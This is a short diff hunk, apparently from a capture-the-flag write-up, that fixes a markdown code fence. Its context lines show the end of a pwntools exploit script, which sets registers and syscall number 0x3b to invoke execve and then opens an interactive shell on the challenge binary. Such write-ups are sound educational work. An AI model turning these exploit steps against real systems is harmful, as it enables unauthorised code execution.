@@ -71,7 +71,8 @@ p.sendlineafter('want for r10?',str(0))
 p.sendlineafter('want for r8?',str(0))
 p.sendlineafter('want for r9?',str(0))
 p.sendlineafter('syscall number to call?',str(0x3b))
-p.interactive()```
+p.interactive()
+```
 
 and above code is execve.
 
